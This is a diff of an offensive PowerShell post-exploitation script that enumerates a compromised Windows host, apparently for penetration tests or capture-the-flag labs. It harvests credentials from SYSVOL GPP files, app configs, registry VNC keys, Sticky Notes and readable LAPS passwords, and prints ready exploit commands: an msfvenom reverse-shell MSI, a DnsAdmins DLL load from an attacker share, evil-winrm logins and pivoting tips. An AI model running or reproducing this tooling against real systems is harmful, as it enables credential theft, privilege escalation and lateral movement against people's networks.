+        Get-Item "C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes*\LocalState\plum.sqlite" -EA SilentlyContinue |
+        Where-Object { $_.Length -gt 0 } | ForEach-Object {
             Hot "Sticky Notes DB: $($_.FullName)"
             Expl "sqlite3 plum.sqlite 'SELECT Text FROM Note;'"
         }
     } catch {}
 
     # ------------------------------------------------------------------
-    # 10. GPP PASSWORDS (SYSVOL)
+    # GPP PASSWORDS
     # ------------------------------------------------------------------
     Sec "GPP PASSWORDS IN SYSVOL"
     if ($isDomain) {
         try {
-            $domain = $env:USERDNSDOMAIN
-            $sysvol = "\\$domain\SYSVOL\$domain\Policies"
-            if (Test-Path $sysvol -ErrorAction SilentlyContinue) {
-                Get-ChildItem $sysvol -Recurse -ErrorAction SilentlyContinue |
+            $sysvol = "\\$env:USERDNSDOMAIN\SYSVOL\$env:USERDNSDOMAIN\Policies"
+            if (Test-Path $sysvol -EA SilentlyContinue) {
+                Get-ChildItem $sysvol -Recurse -EA SilentlyContinue |
                 Where-Object { $_.Name -match "Groups|Services|ScheduledTasks|DataSources" -and $_.Name -match "\.xml$" } |
                 ForEach-Object {
                     $c = Get-ContentSafe $_.FullName 50
                     if ($c -match "cpassword") {
-                        Hot "GPP cpassword in: $($_.FullName)"
+                        Hot "GPP cpassword: $($_.FullName)"
                         $c | Where-Object { $_ -match "cpassword" } | ForEach-Object { Info ">> $_" }
                         Expl "gpp-decrypt <cpassword value>"
                     }
                 }
             }
         } catch {}
-    } else {
-        Info "Not domain-joined; GPP check skipped"
-    }
+    } else { Info "Not domain-joined; skipped" }
 
     # ------------------------------------------------------------------
-    # 11. APP CONFIG FILES WITH CREDENTIALS
+    # APP CONFIG FILES
     # ------------------------------------------------------------------
-    Sec "APP CONFIG FILES (databases, web, creds)"
-    @("C:\wamp", "C:\wamp64", "C:\xampp", "C:\inetpub", "C:\tomcat", "C:\Program Files", "C:\Program Files (x86)") | ForEach-Object {
-        if (Test-Path $_ -ErrorAction SilentlyContinue) {
+    Sec "APP CONFIG FILES WITH CREDENTIALS"
+    @("C:\wamp","C:\wamp64","C:\xampp","C:\inetpub","C:\tomcat","C:\Users","C:\Program Files","C:\Program Files (x86)") | ForEach-Object {
+        if (Test-Path $_ -EA SilentlyContinue) {
             try {
-                Get-ChildItem $_ -Recurse -Depth 5 -ErrorAction SilentlyContinue |
+                Get-ChildItem $_ -Recurse -Depth 5 -EA SilentlyContinue |
                 Where-Object {
-                    $_.Name -match "web\.config|\.env|config\.php|database\.yml|appsettings\.json|tomcat-users\.xml|config\.ini" -and
+                    $_.Name -match "web\.config|\.env|config\.php|wp-config\.php|database\.yml|appsettings\.json|tomcat-users\.xml|config\.ini" -and
                     $_.Length -gt 0 -and -not $_.PSIsContainer
-                } |
-                ForEach-Object {
+                } | ForEach-Object {
                     Hit "Config: $($_.FullName)"
                     Get-ContentSafe $_.FullName 30 |
                     Where-Object { $_ -match "(?i)(pass|password|pwd|secret|key|token|user|connection)" -and $_ -notmatch "^#|^//" } |
-                    ForEach-Object { Info ">> $($_.Trim())" }
+                    Select-Object -First 5 | ForEach-Object { Info ">> $($_.Trim())" }
                 }
             } catch {}
         }
     }
 
     # ------------------------------------------------------------------
-    # 12. SERVICES RUNNING AS DOMAIN USERS
+    # SERVICES RUNNING AS DOMAIN USERS
     # ------------------------------------------------------------------
-    Sec "SERVICES RUNNING AS DOMAIN USERS (lateral move targets)"
+    Sec "SERVICES RUNNING AS DOMAIN USERS"
     if ($isDomain) {
         try {
-            Get-WmiObject Win32_Service -ErrorAction SilentlyContinue |
+            Get-WmiObject Win32_Service -EA SilentlyContinue |
             Where-Object {
                 $_.StartName -notmatch "LocalSystem|LocalService|NetworkService|NT AUTHORITY|NT SERVICE" -and
                 $_.StartName -ne $null -and $_.StartName -ne ""
             } | ForEach-Object {
                 Hit "Service '$($_.Name)' runs as: $($_.StartName)"
                 Info "Binary: $($_.PathName)"
-                Expl "If you own this user account elsewhere → service is privesc target"
+                Expl "If you own this user account → service binary is privesc target"
             }
         } catch {}
-    }
+    } else { Info "Not domain-joined; skipped" }
 
     # ------------------------------------------------------------------
-    # 13. LAPS (LDAP Active Directory Password Solution) SECRETS
+    # LAPS
     # ------------------------------------------------------------------
-    Sec "LAPS SECRETS (if readable)"
+    Sec "LAPS SECRETS"
     if ($isDomain) {
         try {
-            $computerDN = ([ADSI]"LDAP://RootDSE").defaultNamingContext
             $searcher = [ADSISearcher]"(ms-Mcs-AdmPwd=*)"
-            $results = $searcher.FindAll()
+            $results  = $searcher.FindAll()
             if ($results.Count -gt 0) {
                 $results | ForEach-Object {
-                    $lapsPass = $_.Properties["ms-Mcs-AdmPwd"][0]
-                    $computerName = $_.Properties["name"][0]
-                    Hot "LAPS LOCAL ADMIN PASSWORD FOR: $computerName"
-                    Hit "Password: $lapsPass"
-                    Expl "Log in as Administrator@$computerName with this password"
+                    $pass = $_.Properties["ms-Mcs-AdmPwd"][0]
+                    $comp = $_.Properties["name"][0]
+                    Hot "LAPS PASSWORD for $comp : $pass"
+                    Expl "evil-winrm -i $comp -u Administrator -p '$pass'"
                 }
+            } else { Info "LAPS not readable or not configured" }
+        } catch { Info "LAPS check failed (expected if no permissions)" }
+    } else { Info "Not domain-joined; skipped" }
+
+    # ------------------------------------------------------------------
+    # ALWAYSINSTALLELEVATED
+    # ------------------------------------------------------------------
+    Sec "ALWAYSINSTALLELEVATED"
+    $aie1 = Get-Reg "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" "AlwaysInstallElevated"
+    $aie2 = Get-Reg "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" "AlwaysInstallElevated"
+    if ($aie1 -eq 1 -and $aie2 -eq 1) {
+        Hot "AlwaysInstallElevated ENABLED → MSI privesc"
+        Expl "msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o shell.msi"
+        Expl "msiexec /quiet /qn /i shell.msi"
+    } else { Info "AlwaysInstallElevated not enabled" }
+
+    # ------------------------------------------------------------------
+    # DNSADMINS (AD DC privesc)
+    # ------------------------------------------------------------------
+    Sec "DNSADMINS (instant SYSTEM on DC)"
+    if ($isDomain) {
+        try {
+            $groups = whoami /groups 2>$null
+            if ($groups -match "DnsAdmins") {
+                Hot "USER IS IN DNSADMINS → SYSTEM on DC!"
+                Expl "dnscmd DC01 /config /serverlevelplugindll \\ATTACKER\share\malicious.dll"
+                Expl "sc.exe \\DC01 stop dns && sc.exe \\DC01 start dns"
+            } else { Info "Not in DnsAdmins" }
+        } catch {}
+    } else { Info "Not domain-joined; skipped" }
+
+    # ------------------------------------------------------------------
+    # REGISTRY CREDENTIAL SEARCH
+    # ------------------------------------------------------------------
+    Sec "REGISTRY CREDENTIAL SEARCH"
+    @(
+        "HKLM:\SOFTWARE\ORL\WinVNC3\Password",
+        "HKLM:\SOFTWARE\RealVNC\WinVNC4",
+        "HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities",
+        "HKCU:\SOFTWARE\TightVNC\Server",
+        "HKLM:\SOFTWARE\TightVNC\Server"
+    ) | ForEach-Object {
+        if (Test-Path $_ -EA SilentlyContinue) {
+            Hot "Registry creds at: $_"
+            Get-ItemProperty $_ -EA SilentlyContinue | ForEach-Object {
+                $_.PSObject.Properties | Where-Object { $_.Name -notmatch "^PS" } |
+                ForEach-Object { Info "$($_.Name) = $($_.Value)" }
             }
-        } catch {
-            Info "LAPS not readable (expected; requires read permissions on computers)"
         }
     }
 
     # ------------------------------------------------------------------
-    # 14. ALWAYSINSTALLELEVATED
+    # NETWORK INTERFACES (pivot check)
     # ------------------------------------------------------------------
-    Sec "ALWAYSINSTALLELEVATED (MSI elevation)"
-    $aie1 = Get-Reg "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" "AlwaysInstallElevated"
-    $aie2 = Get-Reg "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" "AlwaysInstallElevated"
-    if ($aie1 -eq 1 -and $aie2 -eq 1) {
-        Hot "AlwaysInstallElevated is ENABLED → MSI privesc"
-        Expl "msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o shell.msi"
-        Expl "msiexec /quiet /qn /i shell.msi"
-    } else {
-        Info "AlwaysInstallElevated not enabled"
-    }
+    Sec "NETWORK INTERFACES (pivot opportunities)"
+    try {
+        Get-NetIPAddress -EA SilentlyContinue |
+        Where-Object { $_.AddressFamily -eq "IPv4" -and $_.IPAddress -ne "127.0.0.1" } |
+        ForEach-Object {
+            Hit "Interface: $($_.InterfaceAlias) → $($_.IPAddress)/$($_.PrefixLength)"
+            $myNet     = ($_.IPAddress -split '\.')[0..2] -join '.'
+            $scanNet   = $myNet + ".0/" + $_.PrefixLength
+            Info "Subnet: $scanNet"
+            Expl "Pivot: ligolo / chisel / ssh -L to reach $scanNet"
+        }
+    } catch {}
 
     # ------------------------------------------------------------------
-    # 15. INTERESTING FILES (flags, proofs, notes)
+    # RECENTLY ACCESSED FILES
     # ------------------------------------------------------------------
-    Sec "INTERESTING FILES (proof, flag, cred, note patterns)"
+    Sec "RECENTLY ACCESSED FILES"
     try {
-        Get-ChildItem "C:\Users\" -Recurse -ErrorAction SilentlyContinue |
+        Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent\" -EA SilentlyContinue |
+        Sort-Object LastWriteTime -Descending | Select-Object -First 20 |
+        ForEach-Object { Info "Recent: $($_.Name) ($($_.LastWriteTime))" }
+    } catch {}
+
+    # ------------------------------------------------------------------
+    # INTERESTING FILES
+    # ------------------------------------------------------------------
+    Sec "INTERESTING FILES (proof, flag, cred, note)"
+    try {
+        Get-ChildItem "C:\Users\" -Recurse -EA SilentlyContinue |
         Where-Object {
-            $_.Name -match "(?i)(proof|flag|pass|cred|secret|key|todo|note)" -and
-            -not $_.PSIsContainer -and
-            $_.Length -gt 0
-        } |
-        ForEach-Object {
+            $_.Name -match "(?i)(proof|flag|pass|cred|secret|key|todo|note|local\.txt|proof\.txt)" -and
+            -not $_.PSIsContainer -and $_.Length -gt 0
+        } | ForEach-Object {
             Hit "Interesting: $($_.FullName)"
             if ($_.Extension -match "txt|ini|xml|config|log") {
                 Get-ContentSafe $_.FullName 10 | ForEach-Object { Info ">> $_" }
@@ -578,27 +603,23 @@ function Invoke-Korek {
     # ------------------------------------------------------------------
     # PRIORITY FINDINGS SUMMARY
     # ------------------------------------------------------------------
-    Sec "PRIORITY FINDINGS (act on these first)"
+    Sec "PRIORITY FINDINGS SUMMARY (act on [!!] first)"
     if ($findings.Count -gt 0) {
         $findings | Select-Object -Unique | ForEach-Object { Log $_ }
     } else {
-        Info "No critical findings; escalate via service misconfig, unquoted paths, or scheduled tasks"
+        Info "No critical findings — try service misconfigs, unquoted paths, or scheduled tasks"
     }
 
     # ------------------------------------------------------------------
     # OUTPUT
     # ------------------------------------------------------------------
     if ($OutputFile) {
-        try {
-            $out | Out-File $OutputFile -Encoding UTF8
-            Hit "Output saved: $OutputFile"
-        } catch {
-            Log "[-] Could not save to $OutputFile : $_" "Red"
-        }
+        try { $out | Out-File $OutputFile -Encoding UTF8 ; Hit "Saved: $OutputFile" }
+        catch { Log "[-] Could not save: $_" "Red" }
     }
 
     Log "`n[+] Done!" "Green"
-    Log "    [!!] = Critical finding (ACT NOW)" "Red"
-    Log "    [+]  = High-value finding" "Green"
-    Log "    [EXPLOIT] = Exploitation command" "Yellow"
+    Log "    [!!] = Critical (act now)" "Red"
+    Log "    [+]  = High value finding" "Green"
+    Log "    [EXPLOIT] = Exact exploit command" "Yellow"
 }
